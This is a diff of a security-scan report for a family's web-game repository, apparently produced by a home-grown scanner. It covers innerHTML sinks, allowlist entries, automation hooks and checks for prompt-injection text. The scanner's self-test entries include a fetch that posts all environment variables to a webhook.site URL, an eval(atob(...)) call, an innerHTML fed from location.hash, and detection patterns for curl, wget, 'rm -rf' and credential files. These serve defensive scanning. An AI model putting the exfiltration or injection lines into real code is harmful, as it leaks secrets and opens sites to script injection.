+project-bolt-stackblitz-starters-kppnjtxg/project/docs/hacker-journey.html:1453 [INNERHTML_DYNAMIC] a.className = 'badge'; a.href = '#' + s.id; a.innerHTML = hex + '<span>' + n + '</span>';  (allowlisted: our guide pages (written by Corey, not the son); innerHTML is fed constants only)
+project-bolt-stackblitz-starters-kppnjtxg/project/docs/hacker-journey.html:1494 [INNERHTML_DYNAMIC] $('#room-info').innerHTML = '<h3>' + r.f + '</h3><div class="meta"><span class="tag ' + r.k + '">' + kindLabel[r.k] + '</span>' + (r.n ? '<span class…  (allowlisted: our guide pages (written by Corey, not the son); innerHTML is fed constants only)
+project-bolt-stackblitz-starters-kppnjtxg/project/docs/hacker-journey.html:1511 [INNERHTML_CONST] if (m === 'real') $('#beat-say').innerHTML = 'Real speed: all three phases blur together, about <b>60 times every second</b>.';  (allowlisted: our guide pages (written by Corey, not the son); innerHTML is fed constants only)
+project-bolt-stackblitz-starters-kppnjtxg/project/docs/hacker-journey.html:1512 [INNERHTML_DYNAMIC] if (m === 'pause') $('#beat-say').innerHTML = 'Paused. ' + says[phase];  (allowlisted: our guide pages (written by Corey, not the son); innerHTML is fed constants only)
+project-bolt-stackblitz-starters-kppnjtxg/project/docs/hacker-journey.html:1533 [INNERHTML_DYNAMIC] if (acc >= dur) { acc = 0; phase = (phase + 1) % 3; if (phase === 0) { frame++; $('#st-frame').textContent = frame.toLocaleString(); $('#st-dt').text…  (allowlisted: our guide pages (written by Corey, not the son); innerHTML is fed constants only)
+project-bolt-stackblitz-starters-kppnjtxg/project/docs/hacker-journey.html:1558 [INNERHTML_DYNAMIC] var k = document.createElement('div'); k.innerHTML = '<span><i style="background:var(--r' + (i + 1) + ')"></i>' + n + '</span><b>0%</b>'; keyEl.appen…  (allowlisted: our guide pages (written by Corey, not the son); innerHTML is fed constants only)
+project-bolt-stackblitz-starters-kppnjtxg/project/docs/hacker-journey.html:1576 [INNERHTML_DYNAMIC] $('#loot-info').innerHTML = '<b>' + name + '</b><span>' + RAR[rank - 1] + ' ' + slot + ' · power ' + power + ' · ' + stat + '</span>';  (allowlisted: our guide pages (written by Corey, not the son); innerHTML is fed constants only)
+project-bolt-stackblitz-starters-kppnjtxg/project/docs/hacker-journey.html:1578 [INNERHTML_DYNAMIC] $('#history').innerHTML = hist.map(function (h) { return '<span>' + h + '</span>'; }).join('');  (allowlisted: our guide pages (written by Corey, not the son); innerHTML is fed constants only)
+project-bolt-stackblitz-starters-kppnjtxg/project/docs/hacker-journey.html:1583 [INNERHTML_CONST] var f = +$('#floor').value, svg = $('#roomsvg'); svg.innerHTML = '';  (allowlisted: our guide pages (written by Corey, not the son); innerHTML is fed constants only)
+project-bolt-stackblitz-starters-kppnjtxg/project/docs/hacker-journey.html:1619 [INNERHTML_DYNAMIC] $('#room-read').innerHTML = name + ' · ' + count + ' blockers · ' + enemies.length + ' enemies' + (boss ? ' (boss!)' : '') + (stuck ? ' · <span class…  (allowlisted: our guide pages (written by Corey, not the son); innerHTML is fed constants only)
+project-bolt-stackblitz-starters-kppnjtxg/project/docs/hacker-journey.html:1630 [INNERHTML_DYNAMIC] $('#hack-say').innerHTML = v !== '' && !num  (allowlisted: our guide pages (written by Corey, not the son); innerHTML is fed constants only)
+project-bolt-stackblitz-starters-kppnjtxg/project/docs/hacker-journey.html:1656 [INNERHTML_DYNAMIC] c.innerHTML = '<div class="quest-h"><span class="pips" title="difficulty ' + q.d + ' of 3">' + pips + '</span><span class="xpv">+' + q.d * 100 + ' XP…  (allowlisted: our guide pages (written by Corey, not the son); innerHTML is fed constants only)
+project-bolt-stackblitz-starters-kppnjtxg/project/docs/hacker-journey.html:1685 [INNERHTML_DYNAMIC] var col = document.createElement('div'); col.className = 'branch'; col.innerHTML = '<span>' + br[0] + '</span>';  (allowlisted: our guide pages (written by Corey, not the son); innerHTML is fed constants only)
+project-bolt-stackblitz-starters-kppnjtxg/project/docs/hacker-journey.html:1688 [INNERHTML_DYNAMIC] b.innerHTML = '<small>' + tierName[n[0]].split(' ·')[0] + '</small>' + n[1];  (allowlisted: our guide pages (written by Corey, not the son); innerHTML is fed constants only)
+project-bolt-stackblitz-starters-kppnjtxg/project/docs/hacker-journey.html:1697 [INNERHTML_DYNAMIC] $('#node-detail').innerHTML = '<span class="cap">' + branch.toUpperCase() + ' · ' + tierName[n[0]] + '</span><h3>' + n[1] + '</h3><p>' + n[2] + '</p>…  (allowlisted: our guide pages (written by Corey, not the son); innerHTML is fed constants only)
+project-bolt-stackblitz-starters-kppnjtxg/project/docs/hacker-journey.html:1728 [INNERHTML_DYNAMIC] $('#matrix').innerHTML = h + '</tbody></table>';  (allowlisted: our guide pages (written by Corey, not the son); innerHTML is fed constants only)
+project-bolt-stackblitz-starters-kppnjtxg/project/docs/index.html:7 [EXTERNAL_STYLE_NO_SRI] <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=DM+Mono:wght@400;500&family=Space+Grotesk:wght@500;700&display=swap">  (allowlisted: our guide pages (written by Corey, not the son); innerHTML is fed constants only)
 project-bolt-stackblitz-starters-kppnjtxg/project/src/components/ui/chart.tsx:78 [DANGEROUS_HTML_DYNAMIC] dangerouslySetInnerHTML={{ __html: Object.entries(THEMES) .map( ([theme, prefix]) => `  (allowlisted: shadcn/ui generated components, vendored three times (chart.tsx injects a constant-shaped <style> string via dangerouslySetInnerHTML))
 project-bolt-stackblitz-starters-kppnjtxg/project/src/components/ui/sidebar.tsx:85 [DOCUMENT_COOKIE] document.cookie = `${SIDEBAR_COOKIE_NAME}=${openState}; path=/; max-age=${SIDEBAR_COOKIE_MAX_AGE}`;  (allowlisted: shadcn/ui generated components, vendored three times (chart.tsx injects a constant-shaped <style> string via dangerouslySetInnerHTML))
+scan/README.md:130 [PIPE_TO_SHELL] - **New script or config setting** (checks [4], [16], [18]). Read it. `curl|sh`, `node -e`, unknown  (allowlisted: the scanner itself contains the signatures it looks for (path:* form also covers FAIL-level rules))
 scan/allowlist.txt:20 [PIPE_TO_SHELL] # automation path of a .replit / hook / CI script whose presence is understood (never one with curl|sh in it)  (allowlisted: the scanner itself contains the signatures it looks for (path:* form also covers FAIL-level rules))
-scan/lib/code-scan.js:141 [DANGEROUS_HTML_DYNAMIC] summary: sinks.length ? `${sinks.length} innerHTML/dangerouslySetInnerHTML assignment(s) built from variables (fine if the variables are the page's o…  (allowlisted: the scanner itself contains the signatures it looks for (path:* form also covers FAIL-level rules))
+scan/lib/code-scan.js:147 [DANGEROUS_HTML_DYNAMIC] summary: sinks.length ? `${sinks.length} innerHTML/dangerouslySetInnerHTML assignment(s) built from variables (fine if the variables are the page's o…  (allowlisted: the scanner itself contains the signatures it looks for (path:* form also covers FAIL-level rules))
 scan/lib/config-scan.js:84 [PIPE_TO_SHELL] const odd = Object.entries(pj.scripts).filter(([, v]) => /\b(curl|wget|bash -c|sh -c|node -e|base64|sudo|rm -rf \/|chmod \+x|\.\/[^ ]*\.sh)\b/.test(v…  (allowlisted: the scanner itself contains the signatures it looks for (path:* form also covers FAIL-level rules))
 scan/lib/config-scan.js:133 [PIPE_TO_SHELL] [/\b(run|execute|exec)\s+(the\s+following\s+)?(command\s+)?[`"']?\s*(curl|wget|bash|sh|powershell|sudo|rm\s+-rf|npm\s+install|npx)\b/i, 'instruction …  (allowlisted: the scanner itself contains the signatures it looks for (path:* form also covers FAIL-level rules))
 scan/lib/config-scan.js:3 [NPMRC_READ] // Reads a file list (tracked + untracked) on stdin. Emits checks 17 (.npmrc), 18 (replit / hooks / CI), 19 (AI agent settings), 20 (prompt-injection…  (allowlisted: the scanner itself contains the signatures it looks for (path:* form also covers FAIL-level rules))
@@ -639,9 +552,9 @@ scan/selftest.sh:27 [ATOB] eval(atob('Y29uc29sZS5sb2coMSk='));  (allowlisted: th
 scan/selftest.sh:32 [NET_CALL] fetch('https://webhook.site/abcd', { method: 'POST', body: JSON.stringify(process.env) });  (allowlisted: the scanner itself contains the signatures it looks for (path:* form also covers FAIL-level rules))
 scan/selftest.sh:59 [NET_CALL] fetch('https://api.ipify.org');  (allowlisted: the scanner itself contains the signatures it looks for (path:* form also covers FAIL-level rules))
 scan/selftest.sh:58 [INNERHTML_DYNAMIC] document.getElementById('x').innerHTML = location.hash;  (allowlisted: the scanner itself contains the signatures it looks for (path:* form also covers FAIL-level rules))
-security-scan.sh:205 [NPMRC_READ] echo "$SENS" | while IFS= read -r s; do case "$s" in *.npmrc) echo "info $Z contains $s (content checked after extraction / in [17] if same as repo)"…  (allowlisted: the scanner itself contains the signatures it looks for)
-security-scan.sh:198 [CREDENTIAL_PATHS] SENS=$($GREP -iE '(^|/)(\.env[^/]*|[^/]*\.(pem|key|p12|pfx)|id_rsa[^/]*|\.npmrc|\.netrc|credentials\.json|[^/]*\.sqlite3?)$' "$RUN_DIR/znames.txt" ||…  (allowlisted: the scanner itself contains the signatures it looks for)
-security-scan.sh:253 [CREDENTIAL_PATHS] SENS_HIST=$($GREP -iE '(^|/)(\.env[^/]*|[^/]*\.(pem|key|p12|pfx)|id_rsa[^/]*|\.netrc|credentials\.json|[^/]*\.sqlite3?)$' "$RUN_DIR/added.txt" "$RUN_…  (allowlisted: the scanner itself contains the signatures it looks for)
+security-scan.sh:206 [NPMRC_READ] echo "$SENS" | while IFS= read -r s; do case "$s" in *.npmrc) echo "info $Z contains $s (content checked after extraction / in [17] if same as repo)"…  (allowlisted: the scanner itself contains the signatures it looks for)
+security-scan.sh:199 [CREDENTIAL_PATHS] SENS=$($GREP -iE '(^|/)(\.env[^/]*|[^/]*\.(pem|key|p12|pfx)|id_rsa[^/]*|\.npmrc|\.netrc|credentials\.json|[^/]*\.sqlite3?)$' "$RUN_DIR/znames.txt" ||…  (allowlisted: the scanner itself contains the signatures it looks for)
+security-scan.sh:254 [CREDENTIAL_PATHS] SENS_HIST=$($GREP -iE '(^|/)(\.env[^/]*|[^/]*\.(pem|key|p12|pfx)|id_rsa[^/]*|\.netrc|credentials\.json|[^/]*\.sqlite3?)$' "$RUN_DIR/added.txt" "$RUN_…  (allowlisted: the scanner itself contains the signatures it looks for)
 ```
 
 ### [8] External hosts referenced by code/markup/css — PASS
@@ -678,22 +591,22 @@ accepted project-bolt-stackblitz-starters-kppnjtxg/project/artifacts/mockup-sand
 accepted project-bolt-stackblitz-starters-kppnjtxg/project/artifacts/mockup-sandbox/vite.config.ts:61 [VITE_ALLOWED_HOSTS_TRUE] preview.allowedHosts: true -> any Host header accepted; DNS-rebinding can read source code (GHSA-vg6x-rcgg-rjx6)  (allowlisted: Replit template leftovers (artifacts/global-arcade, artifacts/mockup-sandbox) that are never started on this host (CLAUDE.md); allowedHosts true would be unsafe if they were. Remove this line if they are ever used)
 ```
 
-### [26a] Code in stackblitz-starters-old.zip: malicious indicators (FAIL-level) — PASS
+### [26a] Code in stackblitz-starters-gg5payac-11-24.zip: malicious indicators (FAIL-level) — PASS
 
-no known-bad patterns in 262 files
+no known-bad patterns in 264 files
 
 ### [17] .npmrc content — PASS
 
 1 file(s), only harmless keys
 
-### [18] Automation hooks (Replit, git hooks, CI, scripts) — WARN
+### [18] Automation hooks (Replit, git hooks, CI, scripts) — PASS
 
-1 automation entry point(s) to know about
+no automation that would run code on this host
 
 ```
 ok   project-bolt-stackblitz-starters-kppnjtxg/project/.replit: [postMerge] runs scripts/post-merge.sh on Replit after merges -> set -e pnpm install --frozen-lockfile pnpm --filter db push  (accepted: Replit template leftover; [postMerge] only runs inside Replit, never on this host)
 INFO project-bolt-stackblitz-starters-kppnjtxg/project/.replit: deployment.postBuild args = ["pnpm", "store", "prune"]
-WARN deploy/Dockerfile: automation script (12 lines)
+ok   deploy/Dockerfile: automation script (12 lines)  (accepted: our build recipe (nginx image of the finished game); see CLAUDE.md "How the game is hosted")
 ok   project-bolt-stackblitz-starters-kppnjtxg/project/scripts/post-merge.sh: automation script (3 lines) notable: 3: pnpm install --frozen-lockfile  (accepted: Replit template leftover (pnpm install + db push); not invoked by anything on this host)
 ok   .git/hooks: only .sample files (no active hooks)
 INFO project-bolt-stackblitz-starters-kppnjtxg/project/package.json: stackblitz.installDependencies=true, startCommand="npm run dev" (only runs inside StackBlitz)
@@ -708,54 +621,46 @@ INFO .claude/settings.local.json: enabledPlugins = mm3@mvp-scale
 ok   .claude/settings.local.json: no hooks, no broad permissions
 INFO project-bolt-stackblitz-starters-kppnjtxg/project/.claude/settings.local.json: enabledPlugins = mm3@mvp-scale
 ok   project-bolt-stackblitz-starters-kppnjtxg/project/.claude/settings.local.json: no hooks, no broad permissions
-INFO 2 AI memory/ledger file(s): project-bolt-stackblitz-starters-kppnjtxg/project/.agents/memory/MEMORY.md, project-bolt-stackblitz-starters-kppnjtxg/project/.agents/memory/flagship-game-direction.md
+INFO 3 AI memory/ledger file(s): .claude/commands/scan-new-zip.md, project-bolt-stackblitz-starters-kppnjtxg/project/.agents/memory/MEMORY.md, project-bolt-stackblitz-starters-kppnjtxg/project/.agents/memory/flagship-game-direction.md
 INFO agent instruction files: CLAUDE.md, project-bolt-stackblitz-starters-kppnjtxg/project/replit.md (scanned for injection text in check 20)
 ```
 
 ### [20] Prompt-injection style text in docs, memory and config — PASS
 
-no injection-style phrases in 42 text/config files
+no injection-style phrases in 43 text/config files
 
 ### [27] npm install-scripts ls — INFO
 
 not available in npm 11.10.1 (added in a newer npm); install scripts are still blocked by --ignore-scripts in scan/contained-install.sh
 
-### [7e] Code patterns: HTML injection sinks with variable input — WARN
+### [7e] Code patterns: HTML injection sinks with variable input — PASS
 
-14 innerHTML/dangerouslySetInnerHTML assignment(s) built from variables (fine if the variables are the page's own constants; a bug if they ever hold player input)
+no innerHTML/dangerouslySetInnerHTML with variable input outside the allowlist
 
-```
-project-bolt-stackblitz-starters-kppnjtxg/project/docs/hacker-journey.html:1453 [INNERHTML_DYNAMIC] a.className = 'badge'; a.href = '#' + s.id; a.innerHTML = hex + '<span>' + n + '</span>';
-project-bolt-stackblitz-starters-kppnjtxg/project/docs/hacker-journey.html:1494 [INNERHTML_DYNAMIC] $('#room-info').innerHTML = '<h3>' + r.f + '</h3><div class="meta"><span class="tag ' + r.k + '">' + kindLabel[r.k] + '</span>' + (r.n ? '<span class…
-project-bolt-stackblitz-starters-kppnjtxg/project/docs/hacker-journey.html:1512 [INNERHTML_DYNAMIC] if (m === 'pause') $('#beat-say').innerHTML = 'Paused. ' + says[phase];
-project-bolt-stackblitz-starters-kppnjtxg/project/docs/hacker-journey.html:1533 [INNERHTML_DYNAMIC] if (acc >= dur) { acc = 0; phase = (phase + 1) % 3; if (phase === 0) { frame++; $('#st-frame').textContent = frame.toLocaleString(); $('#st-dt').text…
-project-bolt-stackblitz-starters-kppnjtxg/project/docs/hacker-journey.html:1558 [INNERHTML_DYNAMIC] var k = document.createElement('div'); k.innerHTML = '<span><i style="background:var(--r' + (i + 1) + ')"></i>' + n + '</span><b>0%</b>'; keyEl.appen…
-project-bolt-stackblitz-starters-kppnjtxg/project/docs/hacker-journey.html:1576 [INNERHTML_DYNAMIC] $('#loot-info').innerHTML = '<b>' + name + '</b><span>' + RAR[rank - 1] + ' ' + slot + ' · power ' + power + ' · ' + stat + '</span>';
-project-bolt-stackblitz-starters-kppnjtxg/project/docs/hacker-journey.html:1578 [INNERHTML_DYNAMIC] $('#history').innerHTML = hist.map(function (h) { return '<span>' + h + '</span>'; }).join('');
-project-bolt-stackblitz-starters-kppnjtxg/project/docs/hacker-journey.html:1619 [INNERHTML_DYNAMIC] $('#room-read').innerHTML = name + ' · ' + count + ' blockers · ' + enemies.length + ' enemies' + (boss ? ' (boss!)' : '') + (stuck ? ' · <span class…
-project-bolt-stackblitz-starters-kppnjtxg/project/docs/hacker-journey.html:1630 [INNERHTML_DYNAMIC] $('#hack-say').innerHTML = v !== '' && !num
-project-bolt-stackblitz-starters-kppnjtxg/project/docs/hacker-journey.html:1656 [INNERHTML_DYNAMIC] c.innerHTML = '<div class="quest-h"><span class="pips" title="difficulty ' + q.d + ' of 3">' + pips + '</span><span class="xpv">+' + q.d * 100 + ' XP…
-project-bolt-stackblitz-starters-kppnjtxg/project/docs/hacker-journey.html:1685 [INNERHTML_DYNAMIC] var col = document.createElement('div'); col.className = 'branch'; col.innerHTML = '<span>' + br[0] + '</span>';
-project-bolt-stackblitz-starters-kppnjtxg/project/docs/hacker-journey.html:1688 [INNERHTML_DYNAMIC] b.innerHTML = '<small>' + tierName[n[0]].split(' ·')[0] + '</small>' + n[1];
-project-bolt-stackblitz-starters-kppnjtxg/project/docs/hacker-journey.html:1697 [INNERHTML_DYNAMIC] $('#node-detail').innerHTML = '<span class="cap">' + branch.toUpperCase() + ' · ' + tierName[n[0]] + '</span><h3>' + n[1] + '</h3><p>' + n[2] + '</p>…
-project-bolt-stackblitz-starters-kppnjtxg/project/docs/hacker-journey.html:1728 [INNERHTML_DYNAMIC] $('#matrix').innerHTML = h + '</tbody></table>';
-```
+### [26b] Code in stackblitz-starters-gg5payac-11-24.zip: needs a human look (WARN-level) — PASS
+
+no eval, Function constructor, child_process, cookie access or secret storage in the zip outside the allowlist
 
 ## What changed since the last commit
 
 Working-tree changes (`git status --porcelain`):
 
 ```
+ M .gitignore
  M CLAUDE.md
  M project-bolt-stackblitz-starters-kppnjtxg/project/UPDATE-INSTRUCTION.md
- M project-bolt-stackblitz-starters-kppnjtxg/project/src/App.tsx
- M project-bolt-stackblitz-starters-kppnjtxg/project/src/components/BuriedComplexGame.tsx
- M project-bolt-stackblitz-starters-kppnjtxg/project/src/lib/deep-signal-engine.ts
  M reports/latest.json
+ D scan/CONTEXT7-NOTES.md
+ M scan/README.md
+ M scan/allowlist.txt
+ M scan/lib/code-scan.js
+ M scan/lib/registry-meta.js
  M security-scan.sh
-?? project-bolt-stackblitz-starters-kppnjtxg/project/src/lib/Pixel-skins.ts
-?? reports/security-report-2026-11-24-1250.md
-?? scan/update-check.sh
+D  stackblitz-starters-11-22-26.zip
+D  stackblitz-starters-old.zip
+?? .claude/
+?? deploy/verify-live.sh
+?? reports/security-report-2026-11-24-1322.md
 ?? stackblitz-starters-gg5payac-11-24.zip
 ```
 
@@ -816,6 +721,9 @@ Entries live in `scan/allowlist.txt`. Each needs a reason and a date. "matched" 
 | host | `signal.gamelab.link` | the family's own Cloudflare tunnel hostname | 2026-11-22 | see check output |
 | host | `github.com` | links to source repos in docs | 2026-11-22 | see check output |
 | host | `registry.npmjs.org` | the scanner's own registry URLs | 2026-11-22 | see check output |
+| automation | `deploy/Dockerfile` | our build recipe (nginx image of the finished game); see CLAUDE.md "How the game is hosted" | 2026-11-24 | see check output |
+| automation | `deploy/verify-live.sh` | our read-only check that the live container and public site match what we built | 2026-11-24 | see check output |
+| code | `project-bolt-stackblitz-starters-kppnjtxg/project/docs/**` | our guide pages (written by Corey, not the son); innerHTML is fed constants only | 2026-11-24 | see check output |
 
 Allowlisted hits are still printed in checks 7d and 14e so nothing is silently hidden.
 
